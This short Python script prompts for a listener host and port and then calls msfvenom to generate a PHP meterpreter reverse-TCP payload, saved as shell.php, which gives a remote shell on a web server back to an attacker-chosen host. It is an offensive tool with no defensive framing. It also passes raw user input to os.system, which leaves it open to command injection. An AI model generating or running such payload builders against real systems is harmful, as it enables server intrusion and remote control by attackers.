import os
import subprocess

def clear():
    subprocess.call("clear")

class app:
    clear()
    f = input("add LHOST =>")
    print(f)
    c = input("add LPORT =>")
    print(c)
    os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST=" + f + " " + "LPORT=" + c + " " + "-f raw > shell.php")
